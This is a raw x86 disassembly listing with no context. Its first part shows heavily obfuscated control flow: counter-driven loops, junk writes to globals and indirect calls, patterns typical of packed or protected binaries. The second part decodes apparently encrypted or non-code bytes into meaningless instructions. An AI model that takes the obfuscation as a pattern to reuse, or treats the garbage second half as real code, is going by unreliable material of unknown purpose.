  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423913
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x4238fe
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a34
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0xb7d7ebdc
  41ccad:	mov    ds:0xfc97f8a6,eax
  41ccb2:	popa   
  41ccb3:	bound  edi,QWORD PTR [edi+ebx*2]
  41ccb6:	bound  esp,QWORD PTR [edx+0x3b]
  41ccb9:	xchg   BYTE PTR [edx+0x1c],dh
  41ccbc:	xor    al,0xc1
  41ccbe:	push   eax
  41ccbf:	test   eax,0x47834ef3
  41ccc4:	(bad)  
  41ccc5:	pop    edx
  41ccc6:	mov    al,0x18
  41ccc8:	out    dx,al
  41ccc9:	popf   
  41ccca:	into   
  41cccb:	jmp    0xbc12:0x6864180
  41ccd2:	jns    0x41ccda
  41ccd4:	jp     0x41cc8c
  41ccd6:	idiv   ecx
  41ccd8:	jp     0x41cc67
  41ccda:	enter  0xb91,0x46
  41ccde:	mov    cl,0x19
  41cce0:	cmp    BYTE PTR [ebx],bl
  41cce2:	pushf  
  41cce3:	retf   0x5ef
  41cce6:	lahf   
  41cce7:	mov    ah,0x33
  41cce9:	cmp    esi,esi
  41cceb:	icebp  
  41ccec:	pop    ecx
  41cced:	add    al,0x3c
  41ccef:	or     eax,0xcd5d09d1
  41ccf4:	mov    bh,0xa5
  41ccf6:	sub    eax,edx
  41ccf8:	ror    DWORD PTR [ecx+0x74],0xa3
  41ccfc:	inc    esp
  41ccfd:	mov    ch,0x1
  41ccff:	cmp    DWORD PTR [edi+0x6a992ec7],ecx
  41cd05:	mov    fs,WORD PTR [edx]
  41cd07:	ins    BYTE PTR es:[edi],dx
  41cd08:	add    dl,BYTE PTR [edi]
  41cd0a:	fisubr WORD PTR [ebx]
  41cd0c:	call   0x3a62af72
  41cd11:	pop    ecx
  41cd12:	jge    0x41cd1d
  41cd14:	dec    ecx
  41cd15:	lahf   
  41cd16:	cs hlt 
  41cd18:	mov    cl,0x72
  41cd1a:	ja     0x41cd40
  41cd1c:	iret   
  41cd1d:	add    eax,0x2c371a4b
  41cd22:	data16 xor al,0x2b
  41cd25:	mov    WORD PTR [eax],ss
  41cd27:	aas    
  41cd28:	and    al,bh
  41cd2a:	adc    esp,DWORD PTR [ecx]
  41cd2c:	lea    ecx,[eax+0x39]
  41cd2f:	cmp    edi,esi
  41cd31:	rcr    DWORD PTR [esi],cl
  41cd33:	mov    edi,0x4407b50
  41cd39:	fldlg2 
  41cd3b:	test   eax,0x679e632d
  41cd40:	inc    esi
  41cd41:	mov    DWORD PTR [ebx-0xc],esp
  41cd44:	add    bh,BYTE PTR [esi-0x1458d817]
  41cd4a:	dec    esi
  41cd4b:	push   edi
  41cd4c:	into   
  41cd4d:	cwde   
  41cd4e:	push   esp
  41cd4f:	pop    edx
  41cd50:	inc    BYTE PTR [eax+ebp*1+0x126e1364]
  41cd57:	push   esi
  41cd58:	add    DWORD PTR [ecx-0x16],ecx
  41cd5b:	push   es
  41cd5c:	imul   esp,DWORD PTR cs:[esi*1-0x53271144],0xffffffcb
  41cd65:	pop    edi
  41cd66:	and    esp,DWORD PTR [edx-0x5ba9e437]
  41cd6c:	fnstcw WORD PTR ds:0x37b8f245
  41cd72:	push   esi
  41cd73:	xchg   esp,eax
  41cd74:	pop    ds
  41cd75:	push   0x28bbbe02
  41cd7a:	xor    BYTE PTR [ecx+ebx*8],dl
  41cd7d:	xchg   esp,eax
  41cd7e:	retw   
  41cd80:	push   cs
  41cd81:	gs pop ebp
  41cd83:	ret    0x6eec
  41cd86:	call   0xd22c418e
  41cd8b:	sub    ch,BYTE PTR [ebp-0x7698b930]
  41cd91:	inc    eax
  41cd92:	jno    0x41cdec
  41cd94:	or     DWORD PTR [eax],esp
  41cd96:	sti    
  41cd97:	mov    ds:0x773c36ef,eax
  41cd9c:	nop
  41cd9d:	loop   0x41ce14
  41cd9f:	sti    
  41cda0:	lock icebp 
  41cda2:	xchg   DWORD PTR [edi-0x1f],esp
  41cda5:	aam    0x4
  41cda7:	daa    
  41cda8:	popf   
  41cda9:	in     eax,0x9a
  41cdab:	iret   
  41cdac:	(bad)  
  41cdad:	sbb    eax,0x2ec0c532
  41cdb2:	mov    ds:0x9bb761e4,eax
  41cdb7:	mov    ch,0x4c
  41cdb9:	cmp    eax,0x7f1920c3
  41cdbe:	xor    DWORD PTR [eax-0x67],edi
  41cdc1:	jmp    0xc15c:0xd483dbee
  41cdc8:	cwde   
  41cdc9:	cdq    
  41cdca:	(bad)  
  41cdcb:	fbstp  TBYTE PTR [eax+0x36]
  41cdce:	cs pop ebp
  41cdd0:	push   ds
  41cdd1:	nop
  41cdd2:	xor    al,0x5a
  41cdd4:	rol    DWORD PTR [esi-0x7843fc09],cl
  41cdda:	cmp    bh,dh
  41cddc:	aas    
  41cddd:	call   0x9c89:0x2280aa85
  41cde4:	pop    sp
  41cde6:	ja     0x41cd8a
  41cde8:	mov    al,ds:0x1268ae4d
  41cded:	call   0x136e8cf4
  41cdf2:	cs leave 
  41cdf4:	mov    dh,0x2a
  41cdf6:	cld    
  41cdf7:	or     DWORD PTR ds:0x9fd6aac8,esi
  41cdfd:	ja     0x41ce2a
  41cdff:	mov    edi,0x4fe73588
  41ce04:	mov    edx,0x21873c5f
  41ce09:	sub    al,BYTE PTR [ebx-0x5d173555]
  41ce0f:	inc    eax
  41ce10:	jp     0x41cdac
  41ce12:	sahf   
  41ce13:	in     al,0x4b
  41ce15:	and    edx,DWORD PTR [edi]
  41ce17:	and    cl,BYTE PTR [ebp+0x6d]
  41ce1a:	jne    0x41ce5c
  41ce1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce1d:	sub    BYTE PTR [eax-0x23],dh
  41ce20:	pushf  
  41ce21:	or     eax,0x55c975d9
  41ce26:	push   eax
  41ce27:	cld    
  41ce28:	jb     0x41ce4c
  41ce2a:	ret    0x139c
  41ce2d:	push   esp
  41ce2e:	or     al,dh
  41ce30:	out    dx,eax
  41ce31:	adc    ebp,DWORD PTR [edi]
  41ce33:	pop    ebx
  41ce34:	mov    ebx,0xd4b55c99
  41ce39:	mov    eax,0x63933495
  41ce3e:	shr    DWORD PTR [esi],1
  41ce40:	mov    cl,0xd8
  41ce42:	jno    0x41ce5b
  41ce44:	(bad)  
  41ce45:	push   0x1a8af77d
  41ce4a:	add    DWORD PTR [esi+0x57b35258],ebp
  41ce50:	mov    eax,ds:0xa9e7626b
  41ce55:	cmp    eax,0x2b0ca7d2
  41ce5a:	pop    esp
  41ce5b:	fbstp  TBYTE PTR [edi]
  41ce5d:	repnz xor BYTE PTR [esi+0x3f],cl
  41ce61:	adc    DWORD PTR [esp+eax*4],ecx
  41ce64:	test   DWORD PTR [ebx],edx
  41ce66:	mov    BYTE PTR [edi+0x24],bl
  41ce69:	inc    ebp
  41ce6a:	icebp  
  41ce6b:	cmp    DWORD PTR [ecx+0x4f069bf4],edi
  41ce71:	xor    eax,0x713c7526
  41ce76:	or     eax,0x19d8292c
  41ce7b:	add    al,0xa8
  41ce7d:	jns    0x41ce2e
  41ce7f:	and    DWORD PTR [ebx],0x8d02bb89
  41ce85:	xchg   edx,eax
  41ce86:	and    DWORD PTR es:[ebx+ecx*2+0xa],eax
  41ce8b:	ja     0x41ce5d
  41ce8d:	xor    al,dh
  41ce8f:	or     eax,0x25b5522f
  41ce94:	stos   BYTE PTR es:[edi],al
  41ce95:	rcr    BYTE PTR [eax+0x46],1
  41ce98:	jb     0x41ce56
  41ce9a:	test   dl,0x97
  41ce9d:	add    eax,0x83b7e95a
  41cea2:	cmp    eax,0xca10dd70
  41cea7:	pop    edi
  41cea8:	rcr    bh,0x4a
  41ceab:	test   eax,0xeb911375
  41ceb0:	push   cs
  41ceb1:	js     0x41cf08
  41ceb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceb4:	xor    edx,esi
  41ceb6:	jno    0x41ce8c
  41ceb8:	(bad)  
  41ceb9:	es inc edx
  41cebb:	jecxz  0x41cede
  41cebd:	mov    bl,BYTE PTR [edx]
  41cebf:	adc    edx,0xc28c5017
  41cec5:	out    dx,al
  41cec6:	inc    esp
  41cec7:	clc    
  41cec8:	ret    
  41cec9:	xchg   esp,eax
  41ceca:	and    dh,dl
  41cecc:	adc    DWORD PTR [ecx-0x27edac22],eax
  41ced2:	inc    ebp
  41ced3:	push   cs
  41ced4:	lahf   
  41ced5:	fdiv   QWORD PTR [ecx+ebp*2]
  41ced8:	lods   eax,DWORD PTR ds:[esi]
  41ced9:	mov    ah,0x26
  41cedb:	(bad)  
  41cedc:	mov    ebx,0xe91e387e
  41cee1:	adc    DWORD PTR [ecx+0x6e472458],ebp
  41cee7:	sahf   
  41cee8:	jbe    0x41ce96
  41ceea:	jo     0x41cefd
  41ceec:	inc    esi
  41ceed:	aam    0x27
  41ceef:	cli    
  41cef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cef1:	sub    eax,0x9a163618
  41cef6:	and    ah,BYTE PTR [edx+ecx*4]
  41cef9:	shr    ah,cl
  41cefb:	xor    al,0x4f
  41cefd:	int    0xd9
  41ceff:	fs dec ecx
  41cf01:	pusha  
  41cf02:	xchg   ecx,eax
  41cf03:	or     eax,0xab5383c6
  41cf08:	xchg   ecx,eax
  41cf09:	aam    0x96
  41cf0b:	push   ebp
  41cf0c:	aam    0xcf
  41cf0e:	imul   esp,DWORD PTR [ebx+0x1f79edb9],0xf
  41cf15:	mov    esp,0x2cac00d2
  41cf1a:	mov    DWORD PTR [esi+0x56b8ae82],ebx
  41cf20:	sbb    BYTE PTR [esi],al
  41cf22:	lea    esi,ds:0xd73fb05f
  41cf28:	mov    ch,0x26
  41cf2a:	inc    esi
  41cf2b:	xchg   DWORD PTR [edi+0x54],ebp
  41cf2e:	or     al,0x26
  41cf30:	ins    BYTE PTR es:[edi],dx
  41cf31:	sub    ebx,DWORD PTR [ecx]
  41cf33:	pop    eax
  41cf34:	mov    dh,0x1c
  41cf36:	fdivr  st,st(3)
  41cf38:	or     DWORD PTR [esi],edi
  41cf3a:	pop    ebx
  41cf3b:	jl     0x41cf0b
  41cf3d:	gs mov esp,0x8245ec12
  41cf43:	into   
  41cf44:	jne    0x41cf51
  41cf46:	dec    esp
  41cf47:	iret   
  41cf48:	sahf   
  41cf49:	mov    ecx,0x69bd3a9a
  41cf4e:	push   cs
  41cf4f:	cmp    ebx,DWORD PTR [eax+esi*2-0x6d308646]
  41cf56:	pop    esi
  41cf57:	rcr    cl,0xee
  41cf5a:	fadd   QWORD PTR [esi-0x5d]
  41cf5d:	cdq    
  41cf5e:	enter  0xc157,0xce
  41cf62:	test   dl,dh
  41cf64:	xchg   edx,eax
  41cf65:	sub    BYTE PTR [ebp+0x45],ch
  41cf68:	add    al,0x4e
  41cf6a:	sbb    DWORD PTR [esi],ecx
  41cf6c:	shr    BYTE PTR [esi],1
  41cf6e:	fld    DWORD PTR [ebx]
  41cf70:	xchg   BYTE PTR [ecx-0x671d67f],ch
  41cf76:	fist   WORD PTR [edx-0x618f4b5]
  41cf7c:	mov    ds:0xbbc257dc,al
  41cf81:	fbld   TBYTE PTR [eax]
  41cf83:	and    ebx,ecx
  41cf85:	test   eax,0xb8304f7a
  41cf8a:	rcl    DWORD PTR [edx],cl
  41cf8c:	inc    esp
  41cf8d:	outs   dx,DWORD PTR ds:[esi]
  41cf8e:	mov    al,ds:0xa31adafe
  41cf93:	test   al,0x61
  41cf95:	push   esi
  41cf96:	popf   
  41cf97:	(bad)  
  41cf98:	gs fs js 0x41cfe3
  41cf9c:	jb     0x41cf7e
  41cf9e:	add    al,0x6a
  41cfa0:	dec    eax
  41cfa1:	call   eax
  41cfa3:	cdq    
  41cfa4:	mov    edx,0x2b4fe9b0
  41cfa9:	sar    BYTE PTR [edx+0x55],cl
  41cfac:	mov    esi,0x739cf6b7
  41cfb1:	inc    ebp
  41cfb2:	sbb    DWORD PTR [edi],ebp
  41cfb4:	inc    eax
  41cfb5:	fiadd  WORD PTR [ebp-0x3c]
  41cfb8:	mov    esp,0xa1a6c884
  41cfbd:	mov    al,ds:0x1131e499
  41cfc2:	arpl   WORD PTR [esi-0x16],dx
  41cfc5:	out    0xb5,al
  41cfc7:	in     eax,dx
